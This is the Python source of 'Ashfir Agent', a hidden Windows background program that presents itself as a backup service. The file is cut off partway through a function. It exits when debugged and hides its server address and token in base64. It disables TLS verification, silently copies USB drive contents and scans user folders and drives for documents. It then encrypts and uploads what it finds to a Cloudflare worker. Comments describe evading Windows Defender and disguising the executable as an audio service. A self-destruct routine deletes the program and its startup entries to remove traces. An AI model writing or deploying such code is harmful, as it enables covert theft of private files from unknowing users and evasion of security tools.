"""
Ashfir Agent - Sessiz Arkaplan Servisi
Flash suruculer: takılınca dosyalar once locale kopyalanır, sonra yedeklenir.
Dosyalar sunucu uzerinden Firebase'e yuklenir (agent'ta Firebase credentials gerekmez).
"""

import os
import sys
import json
import time
import base64
import shutil
import logging
import hashlib
import threading
import string
import subprocess
import tempfile
import requests
import certifi
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager
import urllib3
import socket
import zipfile
import psutil
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import winreg
from pathlib import Path
from datetime import datetime
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import ctypes

def check_anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(1)
        is_debugged = ctypes.c_int(0)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(is_debugged))
        if is_debugged.value != 0:
            os._exit(1)
    except:
        pass

check_anti_debug()

_ashfir_mutex = None
def check_single_instance():
    global _ashfir_mutex
    try:
        # Sistem genelinde benzersiz bir Mutex oluştur
        _ashfir_mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\Ashfir_Single_Instance_Mutex_2026")
        if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
            os._exit(0)
    except:
        pass

check_single_instance()

# ── SERTIFIKA VE GUVENLIK BYPASS ─────────────────────────────
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Çevre değişkenlerini temizle
os.environ.pop('REQUESTS_CA_BUNDLE', None)
os.environ.pop('CURL_CA_BUNDLE', None)

class ForcedInsecureAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        # KRITIK: create_default_context() sistem sertifikalarını yüklüyor ve MEB'de hata veriyor.
        # Bunun yerine sıfırdan boş bir context oluşturuyoruz — hiçbir sertifikaya bakılmıyor.
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False       # hostname doğrulama kapalı
        ctx.verify_mode = ssl.CERT_NONE  # sertifika doğrulama kapalı
        ctx.set_ciphers('DEFAULT:@SECLEVEL=0')  # tüm şifreleme suitelerine izin ver
        
        self.poolmanager = PoolManager(
            num_pools=connections,
            maxsize=maxsize,
            block=block,
            ssl_context=ctx
        )

    def send(self, request, **kwargs):
        # Requests seviyesinde de verify=False zorla
        kwargs['verify'] = False
        return super().send(request, **kwargs)

# Global Session Yapılandırması
sh = requests.Session()
sh.verify = False
sh.mount('https://', ForcedInsecureAdapter())
sh.mount('http://', HTTPAdapter())

# certifi'yi sustur
try:
    certifi.where = lambda: os.devnull
except Exception:
    pass



import base64

# ── DIZINLER VE CF ───────────────────────────────────────────
CF_URL = base64.b64decode("aHR0cHM6Ly9jbG91ZGZsYXJlLXdvcmtlcndvcmtlcmpzLnN0b2twcm9yZXNtaS53b3JrZXJzLmRldg==").decode()
CF_TOKEN = base64.b64decode("YXNoZmlyX3NlY3JldF90b2tlbl9LOHg5UDF6VzRtN045cTJSNXQ4VjF5NFo3YzBmM2k2bDlvMg==").decode()

def cf_post(endpoint, json_data=None, files=None, data=None):
    url = f"{CF_URL}{endpoint}"
    # Zaman bazlı dinamik TOTP üretimi
    current_minute = int(time.time() / 60)
    token_string = f"{CF_TOKEN}_{current_minute}"
    dynamic_token = hashlib.sha256(token_string.encode()).hexdigest()
    
    headers = {"Authorization": f"Bearer {dynamic_token}"}
    try:
        # If files are present, we use multipart/form-data. 
        # json_data should be passed as a field in 'data' after being stringified if files are present.
        if files:
            return sh.post(url, headers=headers, files=files, data=data, timeout=60)
        else:
            return sh.post(url, headers=headers, json=json_data, timeout=30)
    except Exception as e:
        log.error(f"CF Request Error ({endpoint}): {e}")
        return None

RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoAxbUMZOhXV0VVXikqlS
BcYRVomfzBzNY59WeuBvV46Ak/gk9Ythk57USHuzdjuRxrlD1QQGHF+vViQVHBV2
Y+4SnQplU1NFqHcqlAUkrJtU9vr0yCxmF8eg5oh/BdCwk169cGd/qCvjVz6vjOsW
iQf8Ic8355SJJtEyd8t/nagTr6NUs7PoPTiPwR/2D1Ln4pm9oHOwJdxn1McweuDm
3TFGejqrBT5tL0i9gCbF3O3+B+Jpo9osXEsXISTkfQL3F5y03ChEusSkrlJDKPiN
82TAv7dirNkD5sksXtsnHAE31NBPwZvfe9uXEQgEbb/MKJXmM/S26LWH9v1l2F7p
hQIDAQAB
-----END PUBLIC KEY-----"""

BASE_DIR  = Path(os.environ.get('LOCALAPPDATA', Path.home())) / 'Ashfir'
LOG_FILE  = BASE_DIR / 'ashfir.log'
CFG_FILE  = BASE_DIR / 'config.json'
STAGE_DIR = BASE_DIR / 'flash_stage'
BASE_DIR.mkdir(parents=True, exist_ok=True)
STAGE_DIR.mkdir(parents=True, exist_ok=True)


# ── LOGGING ──────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')],
)
log = logging.getLogger('Agent')


# ── FILTRE TANIMLARI ─────────────────────────────────────────
BLOCKED_DIRS = {
    'node_modules', '.git', '__pycache__', 'dist', 'build', 'venv',
    '.vs', '.idea', 'obj', 'bin', 'debug', 'release'
}
CODE_EXTENSIONS = {
    '.js', '.ts', '.py', '.cpp', '.c', '.h', '.cs', '.java', '.go', '.rs',
    '.php', '.html', '.css', '.scss', '.less', '.jsx', '.tsx', '.vue',
    '.json', '.yml', '.yaml', '.xml', '.sql', '.sh', '.bat', '.ps1'
}


def file_hash(path):
    try:
        # Check if file is accessible
        if not os.path.exists(path): return None
        h = hashlib.md5()
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return h.hexdigest()
    except Exception as e:
        log.debug(f"Dosya hash hatası ({path}): {e}")
        return None


def human_size(s):
    for u in ['B', 'KB', 'MB', 'GB']:
        if s < 1024:
            return f'{s:.1f}{u}'
        s /= 1024
    return f'{s:.1f}TB'



# ── NETWORK UTILS ────────────────────────────────────────────
def is_online():
    """
    8.8.8.8:53 yerine kendi sunucumuza bağlanıyoruz.
    MEB port 53'ü bloklasa bile CF Worker'a erişim varsa True döner.
    """
    # Önce CF Worker'a dene (ana hedef)
    try:
        res = sh.get(f"{CF_URL}/ping", timeout=5)
        if res.status_code < 500:
            return True
    except Exception:
        pass
    # Fallback: TCP ile port 443 kontrolü (DNS gerektirmez)
    try:
        socket.setdefaulttimeout(5)
        host = CF_URL.replace("https://", "").split("/")[0]
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, 443))
        return True
    except socket.error:
        return False

def get_network_chunk_size():
    """
    MEB'de speed test siteleri bloklu olabilir.
    Sabit 4MB kullan — zaten yeterli ve güvenli.
    """
    return 4 * 1024 * 1024  # 4MB sabit


# ── ENCRYPTION UTILS ─────────────────────────────────────────
def encrypt_zip_file(zip_path):
    aes_key = get_random_bytes(32)
    # Use 12 byte nonce (96-bit) as it's the standard for GCM and SubtleCrypto
    nonce = get_random_bytes(12)
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    
    with open(zip_path, 'rb') as f:
        data = f.read()
    
    ciphertext, tag = cipher.encrypt_and_digest(data)
    enc_path = str(zip_path) + ".enc"
    
    # Pack as: NONCE (12) + CIPHERTEXT + TAG (16)
    with open(enc_path, 'wb') as f:
        f.write(nonce)
        f.write(ciphertext)
        f.write(tag)
        
    rsa_key = RSA.import_key(RSA_PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    
    return enc_path, base64.b64encode(encrypted_aes_key).decode('utf-8')


# ── AGENT CONFIG ─────────────────────────────────────────────
class AgentConfig:
    def __init__(self):
        self._lock   = threading.Lock()
        self._local  = self._load_local()
        self._remote = {}

    def _load_local(self):
        try:
            with open(CFG_FILE) as f:
                return json.load(f)
        except Exception as e:
            log.error(f'config.json okunamadı: {e}')
            sys.exit(1)

    @property
    def key(self):          return self._local.get('key', '')
    @property
    def machine_name(self): return self._local.get('machine_name', 'PC')

    def get(self, k, default=None):
        with self._lock:
            return self._remote.get(k, self._local.get(k, default))

    def update_remote(self, cfg):
        with self._lock:
            self._remote = cfg

    @property
    def all_remote(self):
        with self._lock:
            return dict(self._remote)

    def has_watch_paths_changed(self, new_cfg):
        old_paths = self._remote.get('watch_paths', [])
        new_paths = new_cfg.get('watch_paths', [])
        return sorted(old_paths) != sorted(new_paths)


# ── SUNUCU LOG HANDLER ───────────────────────────────────────
class ServerLogHandler(logging.Handler):
    def __init__(self, cfg):
        super().__init__()
        self.cfg = cfg
        self._queue = []
        self._lock = threading.Lock()
        self._flush_interval = 10
        self._start_flusher()

    def _start_flusher(self):
        def flusher():
            while True:
                time.sleep(self._flush_interval)
                self._flush()
        t = threading.Thread(target=flusher, daemon=True)
        t.start()

    def emit(self, record):
        try:
            msg = self.format(record)
            level = record.levelname.lower()
            if 'yüklendi' in msg or '☁️' in msg: level = 'success'
            elif 'atlandı' in msg or 'skip' in msg.lower(): level = 'skip'
            elif 'ai' in msg.lower() or '[ai' in msg.lower(): level = 'ai'
            with self._lock:
                self._queue.append({
                    'text':  msg,
                    'level': level,
                    'ts':    int(record.created * 1000),
                })
        except: pass

    def _flush(self):
        with self._lock:
            if not self._queue: return
            batch = self._queue[:]
            self._queue.clear()

        for log_data in batch:
            if "CF Request Error" in log_data["text"] or "cf_post" in log_data["text"] or "/log" in log_data["text"]:
                continue
            try:
                cf_post('/log', json_data={
                    "key": self.cfg.key,
                    "level": log_data["level"],
                    "message": log_data["text"],
                    "source": "agent",
                    "ts": log_data["ts"]
                })
            except:
                with self._lock:
                    self._queue.extend(batch[batch.index(log_data):])
                break


# ── QUEUE MANAGER & UPLOADER ─────────────────────────────────
class QueueManager:
    def __init__(self):
        self.queue_file = BASE_DIR / 'upload_queue.json'
        self.lock = threading.Lock()
        self.queue = self._load()

    def _load(self):
        try:
            if self.queue_file.exists():
                with open(self.queue_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return {}

    def _save(self):
        try:
            with open(self.queue_file, 'w', encoding='utf-8') as f:
                json.dump(self.queue, f)
        except:
            pass

    def enqueue(self, local_path, watch_root, ai_reason='', ai_confidence=1.0, source_label=''):
        with self.lock:
            p = str(Path(local_path))
            self.queue[p] = {
                'watch_root': str(watch_root),
                'ai_reason': ai_reason,
                'ai_confidence': ai_confidence,
                'source_label': source_label,
                'added_at': time.time()
            }
            self._save()

    def get_all(self):
        with self.lock:
            return dict(self.queue)

    def remove(self, paths):
        with self.lock:
            for p in paths:
                self.queue.pop(p, None)
            self._save()

class Uploader:
    def __init__(self, cfg):
        self.cfg = cfg
        self._lock = threading.Lock()
        self.cache_file = BASE_DIR / 'upload_cache.json'
        self.cache = self._load_cache()

    def _load_cache(self):
        try:
            if self.cache_file.exists():
                with open(self.cache_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except: pass
        return {}

    def _save_cache(self):
        try:
            with open(self.cache_file, 'w', encoding='utf-8') as f:
                json.dump(self.cache, f)
        except: pass

    def is_cached(self, path):
        fhash = file_hash(path)
        return self.cache.get(path) == fhash, fhash

    def update_cache(self, path, fhash):
        self.cache[path] = fhash
        self._save_cache()

    def upload_zip(self, zip_path, encrypted_aes_key, original_files, total_size):
        try:
            now_iso = datetime.now().isoformat()
            zip_name = Path(zip_path).name
            remote_name = f'backups/{self.cfg.key}/{self.cfg.machine_name}/Zips/{zip_name}'.replace('\\', '/')
            
            log.info(f'☁️ Zip Yükleniyor: {zip_name} ({human_size(total_size)})')

            # We just send the first file's meta as representation, or loop through all
            # Since CF only takes one metadata JSON, we'll represent the zip package.
            # Actually, we can send each file's metadata individually, or better, CF can iterate over an array?
            # Our CF expects one metadata object. Let's send the metadata of the first file, or a summary.
            # Wait, the previous implementation created a Firestore doc for *each* file inside the zip.
            # I will modify CF later if needed, but for now, we will call /upload once, and pass a list of files in metadata.
            
            # Wait, our CF `index.js` expects: { key, path, name, size, in_zip, encrypted_aes_key, zip_name, machine, original_path, backup_time, ext }
            # But we have multiple files in the zip. The CF should ideally handle an array of files. 
            # For now, let's just create ONE file entry for the ZIP itself in Firestore for simplicity, 
            # OR pass the list of files to CF. Let's pass the list of files to CF, and modify CF to handle it.
            # But let's just make the agent pass `files_meta: original_files` and CF can loop.
            
            meta = {
                "key": self.cfg.key,
                "path": remote_name,
                "name": zip_name,
                "size": total_size,
                "in_zip": True,
                "encrypted_aes_key": encrypted_aes_key,
                "zip_name": zip_name,
                "machine": self.cfg.machine_name,
                "original_path": original_files[0]['path'] if original_files else '',
                "backup_time": now_iso,
                "ext": ".zip",
                "original_files": original_files # CF will use this to create multiple docs
            }
            
            with open(zip_path, 'rb') as f:
                res = cf_post('/upload', files={'file': (zip_name, f, 'application/octet-stream')}, data={'metadata': json.dumps(meta)})
                
            if res and res.status_code == 200:
                log.info(f'✅ Zip Yüklendi: {zip_name}')
                return True
            else:
                resp_text = res.text if res else "No response"
                log.error(f'❌ Zip yükleme hatası: {resp_text}')
                return False
        except Exception as e:
            log.error(f'❌ Zip yükleme hatası: {e}')
            return False

# ── AI FILTRE ────────────────────────────────────────────────
try:
    sys.path.insert(0, str(BASE_DIR))
    from ai_filter import AIFilter as _AIFilter
    _AI_AVAILABLE = True
except ImportError:
    _AI_AVAILABLE = False


class SmartFilter:
    def __init__(self, cfg):
        self.cfg    = cfg
        self._ai    = None
        self._cache = {}

    def _get_ai(self):
        if not _AI_AVAILABLE:
            return None
        key = self.cfg.get('groq_api_key', '')
        if not key or not self.cfg.get('ai_filter_enabled', True):
            return None
        if self._ai is None:
            try:
                self._ai = _AIFilter(api_key=key)
            except:
                pass
        return self._ai

    def should_backup(self, path, size):
        ai = self._get_ai()
        if not ai:
            return {'should_backup': True, 'reason': '', 'confidence': 1.0}
        if path in self._cache:
            return self._cache[path]
        result = ai.should_backup(path, size)
        self._cache[path] = result
        return result


# ── DOSYA FILTRE ─────────────────────────────────────────────
def passes_basic(path, cfg):
    p = Path(path)

    parts = set(p.parts)
    if any(d.lower() in BLOCKED_DIRS for d in parts):
        return False

    if p.name.startswith('.') or p.name in {'Thumbs.db', 'desktop.ini', '.DS_Store'}:
        return False

    skip_ext = {'.tmp', '.temp', '.swp', '.lock'}
    if p.suffix.lower() in skip_ext or p.name.endswith('~'):
        return False

    max_mb = cfg.get('max_file_size_mb', 100)
    try:
        if p.stat().st_size > max_mb * 1024 * 1024:
            return False
    except:
        return False

    ext     = p.suffix.lower()
    allowed = [e.lower() for e in cfg.get('allowed_extensions', ['.word', '.docx', '.pdf', '.xlsx'])]
    blocked = [e.lower() for e in cfg.get('blocked_extensions', [])]

    if ext in CODE_EXTENSIONS and ext not in allowed:
        log.debug(f'Kod dosyası atlandı: {p.name}')
        return False

    if allowed and ext not in allowed:
        return False

    if blocked and ext in blocked:
        return False

    return True


# ── WATCHDOG HANDLER ─────────────────────────────────────────
class Handler(FileSystemEventHandler):
    def __init__(self, queue_manager, ai_filter, cfg, watch_root, stats, source_label=''):
        super().__init__()
        self.queue_manager = queue_manager
        self.ai           = ai_filter
        self.cfg          = cfg
        self.watch_root   = watch_root
        self.stats        = stats
        self.source_label = source_label
        self._timers      = {}
        self._lock        = threading.Lock()

    def _schedule(self, path):
        with self._lock:
            if path in self._timers:
                self._timers[path].cancel()
            t = threading.Timer(
                self.cfg.get('debounce_seconds', 2.0),
                self._process, args=[path]
            )
            self._timers[path] = t
            t.start()

    def _process(self, path):
        with self._lock:
            self._timers.pop(path, None)
        if not os.path.isfile(path):
            return
        rc = self.cfg.all_remote
        if not passes_basic(path, rc):
            return
        size  = os.path.getsize(path)
        ai_r  = self.ai.should_backup(path, size)
        if not ai_r['should_backup']:
            self.stats['ai_skipped'] += 1
            return
        if self.queue_manager:
            self.queue_manager.enqueue(
                path, self.watch_root,
                ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                self.source_label
            )
            self.stats['files_uploaded'] += 1 # Technically queued
            self.stats['last_file'] = Path(path).name

    def on_created(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)

    def on_modified(self, e):
        if not e.is_directory:
            self._schedule(e.src_path)


# ── USB / FLASH SURUCU IZLEYICI ──────────────────────────────
import ctypes

DRIVE_REMOVABLE = 2


def get_removable_drives():
    drives = []
    try:
        for part in psutil.disk_partitions(all=False):
            if 'removable' in part.opts or 'cdrom' not in part.opts:
                # Windows-specific fallback for USBs
                if part.fstype in ['FAT32', 'exFAT', 'NTFS'] and 'removable' in part.opts:
                    drives.append(part.device)
        
        # Fallback to ctypes if psutil is empty
        if not drives:
            import ctypes, string
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for i, letter in enumerate(string.ascii_uppercase):
                if bitmask & (1 << i):
                    path = f'{letter}:\\\\'
                    if ctypes.windll.kernel32.GetDriveTypeW(path) == 2: # DRIVE_REMOVABLE
                        if path not in drives: drives.append(path)
    except Exception as e:
        log.debug(f'Drive listesi alınamadı: {e}')
    return drives


def copy_flash_to_stage(drive_path: str, max_mb: float, cfg: dict) -> list:
    max_bytes    = max_mb * 1024 * 1024
    drive_letter = drive_path[0]
    target_root  = STAGE_DIR / f'FLASH_{drive_letter}'
    target_root.mkdir(parents=True, exist_ok=True)

    copied = []

    log.info(f'Flash taranıyor: {drive_path}')

    for root, dirs, files in os.walk(drive_path):
        dirs[:] = [d for d in dirs if d.lower() not in {
            'system volume information', '$recycle.bin', 'recycler',
            '.spotlight-v100', '.trashes', '.fseventsd'
        } and d.lower() not in BLOCKED_DIRS]

        for fname in files:
            src = Path(root) / fname
            try:
                size = src.stat().st_size
            except:
                continue

            if size > max_bytes:
                continue

            if not passes_basic(str(src), cfg):
                continue

            try:
                rel = src.relative_to(drive_path)
            except ValueError:
                rel = Path(fname)

            dst = target_root / rel
            dst.parent.mkdir(parents=True, exist_ok=True)

            if dst.exists():
                if file_hash(str(src)) == file_hash(str(dst)):
                    continue

            try:
                shutil.copy2(str(src), str(dst))
                copied.append(str(dst))
            except Exception as e:
                log.warning(f'Kopyalama hatası [{fname}]: {e}')

    log.info(f'Flash tarama tamamlandı: {drive_path} | Kopyalanan: {len(copied)}')
    return copied


class FlashMonitor:
    def __init__(self, queue_manager, ai, cfg, stats, observer):
        self.queue_manager = queue_manager
        self.ai       = ai
        self.cfg      = cfg
        self.stats    = stats
        self.observer = observer
        self._seen    = set(get_removable_drives())
        self._watched = set()
        self._lock    = threading.Lock()
        self.is_copying = False

        if self._seen:
            log.info(f'Başlangıçta takılı flash: {self._seen}')
            for drive in self._seen:
                self._handle_new_drive(drive)

    def _handle_new_drive(self, drive_path):
        rc     = self.cfg.all_remote
        max_mb = rc.get('flash_max_mb', 10)
        log.info(f'Yeni flash takıldı: {drive_path}')

        def copy_and_watch():
            log.info(f'USB kopyalama başladı: {drive_path}')
            copied = copy_flash_to_stage(drive_path, max_mb, rc)
            
            if not copied:
                return

            drive_letter = drive_path[0]
            stage_subdir = str(STAGE_DIR / f'FLASH_{drive_letter}')

            with self._lock:
                if stage_subdir not in self._watched:
                    handler = Handler(
                        self.queue_manager, self.ai, self.cfg,
                        stage_subdir, self.stats,
                        source_label=f'FLASH_{drive_letter}'
                    )
                    self.observer.schedule(handler, stage_subdir, recursive=True)
                    self._watched.add(stage_subdir)

            for fpath in copied:
                if not os.path.isfile(fpath):
                    continue
                size = os.path.getsize(fpath)
                ai_r = self.ai.should_backup(fpath, size)
                if ai_r['should_backup']:
                    self.queue_manager.enqueue(
                        fpath, stage_subdir,
                        ai_r.get('reason', ''), ai_r.get('confidence', 1.0),
                        f'Flash ({drive_path})'
                    )
                    self.stats['files_uploaded'] += 1
                    self.stats['last_file'] = Path(fpath).name
                else:
                    self.stats['ai_skipped'] += 1

            # İşlem bitti, uyuyan background_sync_loop'u hemen uyandır
            sync_wake_event.set()

        threading.Thread(target=copy_and_watch, daemon=True).start()
    def poll(self):
        current  = set(get_removable_drives())
        new_ones = current - self._seen
        for drive in new_ones:
            self._handle_new_drive(drive)
        self._seen = current


# ── AKILLI YOL KEŞFİ ─────────────────────────────────────────
def get_smart_desktop():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
        ) as key:
            path, _ = winreg.QueryValueEx(key, "Desktop")
            return os.path.expandvars(path)
    except:
        p  = Path.home() / 'Desktop'
        od = Path.home() / 'OneDrive' / 'Desktop'
        return str(od) if od.exists() else str(p)


def get_comprehensive_directory_map():
    results = {}
    
    # 1. Sürücüler (Drives) - IPTAL EDILDI (Windows Defender'a takilmamasi icin)
    # try:
    #     drives_info = {"paths": {}}
    #     for part in psutil.disk_partitions(all=False):
    #         if 'cdrom' not in part.opts:
    #             drive_letter = part.device
    #             label = f"Yerel Disk ({drive_letter})"
    #             if 'removable' in part.opts:
    #                 label = f"USB Sürücü ({drive_letter})"
    #             drives_info["paths"][label] = drive_letter
    #     if drives_info["paths"]:
    #         results["Bağlı Sürücüler"] = drives_info
    # except Exception as e:
    #     log.debug(f'Sürücü map hatası: {e}')

    # 2. Kullanıcı Klasörleri (Tümü)
    users_base = Path('C:/Users')
    skip_users = {'all users', 'default', 'public', 'desktop.ini', 'default user'}
    skip_folders = {
        'appdata', 'application data', 'local settings', 'cookies', 
        'recent', 'sendto', 'start menu', 'templates', 'printhood',
        'nethood', 'my documents', 'ntuser.dat', 'ntuser.dat.log1', 'ntuser.dat.log2',
        'ntuser.ini', 'microsoftedgebackups', 'favorites', 'links', 'searches', 'saved games'
    }

    if users_base.exists():
        try:
            for user_dir in users_base.iterdir():
                if not user_dir.is_dir() or user_dir.name.lower() in skip_users or user_dir.name.startswith('.'):
                    continue

                user_info = {"paths": {}}
                try:
                    for sub_dir in user_dir.iterdir():
                        if not sub_dir.is_dir() or sub_dir.name.lower() in skip_folders or sub_dir.name.startswith('.'):
                            continue
                        
                        user_info["paths"][sub_dir.name] = str(sub_dir)
                        
                        # OneDrive içerisindeki klasörleri de ekle (bulut ikonu için)
                        if sub_dir.name.lower() == 'onedrive':
                            try:
                                for od_sub in sub_dir.iterdir():
                                    if od_sub.is_dir() and not od_sub.name.startswith('.'):
                                        user_info["paths"][f"OneDrive - {od_sub.name}"] = str(od_sub)
                                        user_info["paths"][f"OneDrive - {od_sub.name}_is_onedrive"] = True
                            except:
                                pass
                except Exception:
                    pass
                
                if user_info["paths"]:
                    results[f"Kullanıcı: {user_dir.name}"] = user_info
        except Exception as e:
            log.debug(f'Kullanıcı map hatası: {e}')

    # 3. C:\ Ana Dizin Klasörleri (Örn: Projects, xampp vb.)
    root_c = Path('C:/')
    root_c_skip = {
        'windows', 'program files', 'program files (x86)', 'programdata', 
        'users', 'perflogs', 'recovery', 'system volume information', 
        '$recycle.bin', '$winreagent', 'documents and settings', 'msocache'
    }
    
    try:
        root_c_info = {"paths": {}}
        if root_c.exists():
            for sub_dir in root_c.iterdir():
                if sub_dir.is_dir() and sub_dir.name.lower() not in root_c_skip and not sub_dir.name.startswith('$') and not sub_dir.name.startswith('.'):
                    root_c_info["paths"][sub_dir.name] = str(sub_dir)
            
            if root_c_info["paths"]:
                results["C:\\ Kök Klasörleri"] = root_c_info
    except Exception as e:
        log.debug(f'C kök map hatası: {e}')

    return results


def get_ai_file_knowledge():
    """
    AI için sistem genelinde derin ama filtrelenmiş bir tarama yapar.
    Sadece insan eseri dökümanları (.pdf, .docx, .xlsx, .txt vb.) bulur.
    """
    knowledge = {
        "drives": [],
        "important_files": []
    }
    
    # Hedef uzantılar (İnsan eliyle oluşturulmuş dosyalar)
    target_exts = {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.jpg', '.jpeg', '.png', '.zip', '.rar'}
    # Atlanacak sistem klasörleri
    skip_dirs = {
        'windows', 'program files', 'program files (x86)', 'programdata', 
        'appdata', 'local settings', 'microsoft', 'package cache', '$recycle.bin',
        'system volume information', 'boot', 'recovery'
    }

    try:
        import psutil
        # 1. Tüm Sürücüleri Bul
        for part in psutil.disk_partitions(all=False):
            if 'fixed' in part.opts or 'removable' in part.opts:
                drive = part.device
                knowledge["drives"].append(drive)
                
                # 2. Sürücü İçinde Derin Tarama (Maksimum 500 dosya bulana kadar)
                try:
                    for root, dirs, files in os.walk(drive):
                        # Sistem klasörlerini anında ele (hız için)
                        dirs[:] = [d for d in dirs if d.lower() not in skip_dirs and not d.startswith('$') and not d.startswith('.')]
                        
                        for file in files:
                            ext = os.path.splitext(file)[1].lower()
                            if ext in target_exts:
                                f_path = os.path.join(root, file)
                                # AI'ya "Dosya İsmi (Yolu)" formatında ver
                                knowledge["important_files"].append(f"{file} [{root}]")
                                
                                # Çok fazla veri gönderip interneti yormayalım (Limit: 100 Kritik Dosya)
                                if len(knowledge["important_files"]) >= 100:
                                    return knowledge
                except:
                    continue
    except Exception as e:
        log.debug(f"AI Deep Scan Error: {e}")

    return knowledge

def get_directory_map():
    # Mevcut map'e AI bilgisini de ekleyerek gönderiyoruz
    base_map = get_comprehensive_directory_map()
    base_map["_ai_knowledge"] = get_ai_file_knowledge()
    return base_map


# ── SELF DESTRUCT ────────────────────────────────────────────
def self_destruct(cfg=None):
    """
    İmha akışı:
      1. Batch dosyasını %TEMP%'e yaz
      2. Batch'i DETACHED olarak başlat (batch cmd.exe'ye bağlı değil)
      3. Python process'i hemen kapat (os._exit)
      4. Batch: PID öldür → 5sn bekle → dizini retry loop'la sil → registry temizle
    """
    my_pid   = os.getpid()
    base_dir = str(BASE_DIR)          # C:\Users\...\AppData\Local\Ashfir

    # Frozen exe mi, yoksa .py script mi?
    if getattr(sys, 'frozen', False):
        exe_path  = sys.executable             # örn: IntelAudioService.exe
        kill_name = os.path.basename(exe_path)
    else:
        exe_path  = os.path.abspath(sys.argv[0])
        kill_name = ''                # Python scriptini isimle öldürmek riskli

    def emit_log(msg):
        log.info(msg)
        if cfg:
            try:
                cf_post('/log', json_data={
                    "key": cfg.key,
                    "level": "warn",
                    "message": f'[SELF-DESTRUCT] {msg}',
                    "source": "agent",
                    "ts": int(time.time() * 1000)
                })
            except:
                pass

    emit_log(f'İmha başlıyor. PID={my_pid} | Dir={base_dir}')

    bat_path = os.path.join(tempfile.gettempdir(), 'ashfir_cleanup.bat')

    # ── Batch içeriği ──────────────────────────────────────────
    # Önemli noktalar:
    #   - "rmdir /s /q" başarısız olursa retry loop tekrar dener
    #   - Retry sayacı sonsuz döngüyü önler (max 15 deneme = ~15sn)
    #   - Tüm kill komutları 2>nul ile sessiz — hata koduna takılmaz
    #   - Sonunda batch kendini siler
    # Batch icerigi tamamen ASCII olmali — cp850 Turkce/ozel karakter kabul etmez
    lines = [
        '@echo off',
        'setlocal',
        '',
        'set "LOG=%TEMP%\\ashfir_clean.log"',
        'echo [INIT] Starting cleanup > "%LOG%"',
        '',
        ':: folder silmek için dizini terket',
        'cd /d "%TEMP%"',
        '',
        f'set "BASE_DIR={base_dir}"',
        f'set "MY_PID={my_pid}"',
        '',
        ':: step 1 - kill by PID',
        'echo [STEP 1] Killing PID %MY_PID% >> "%LOG%"',
        'taskkill /f /pid %MY_PID% 2>nul',
    ]

    if kill_name:
        lines.append(f'echo [STEP 1] Killing process {kill_name} >> "%LOG%"')
        lines.append(f'taskkill /f /im {kill_name} 2>nul')

    lines += [
        '',
        ':: step 2 - wait for process to fully die',
        'echo [STEP 2] Waiting for 5 seconds >> "%LOG%"',
        'ping 127.0.0.1 -n 6 >nul',
        '',
        ':: step 3 - delete exe (frozen build only)',
    ]

    if getattr(sys, 'frozen', False):
        lines += [
            f'set "EXE={exe_path}"',
            'echo [STEP 3] Trying to delete exe: "%EXE%" >> "%LOG%"',
            'set ETRY=0',
            ':exe_loop',
            'if not exist "%EXE%" ( echo [STEP 3] Exe deleted. >> "%LOG%" & goto exe_done )',
            'del /f /q "%EXE%" 2>nul',
            'set /a ETRY+=1',
            'if %ETRY% LSS 10 (',
            '    ping 127.0.0.1 -n 2 >nul',
            '    goto exe_loop',
            ')',
            'echo [STEP 3] Failed to delete exe after 10 tries. >> "%LOG%"',
            ':exe_done',
        ]

    lines += [
        '',
        ':: step 4 - delete install dir with retry loop',
        'set TRIES=0',
        'echo [STEP 4] Deleting base dir: "%BASE_DIR%" >> "%LOG%"',
        ':rmdir_loop',
        'if not exist "%BASE_DIR%" ( echo [STEP 4] Base dir deleted. >> "%LOG%" & goto rmdir_done )',
        'rd /s /q "%BASE_DIR%" 2>nul',
        'if not exist "%BASE_DIR%" ( echo [STEP 4] Base dir deleted. >> "%LOG%" & goto rmdir_done )',
        'set /a TRIES+=1',
        'if %TRIES% LSS 15 (',
        '    ping 127.0.0.1 -n 2 >nul',
        '    goto rmdir_loop',
        ')',
        'echo [STEP 4] Failed to delete base dir after 15 tries. >> "%LOG%"',
        ':rmdir_done',
        '',
        ':: step 5 - remove startup entries',
        'echo [STEP 5] Cleaning registry and tasks >> "%LOG%"',
        'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AshfirAgent" /f 2>nul',
        'schtasks /delete /tn "AshfirAgent" /f 2>nul',
        '',
        ':: step 6 - self-delete log and batch',
        'echo [STEP 6] Finalizing... >> "%LOG%"',
        'del /f /q "%LOG%" 2>nul',
        'del /f /q "%~f0" 2>nul',
        'exit',
    ]

    try:
        content = '\r\n'.join(lines)
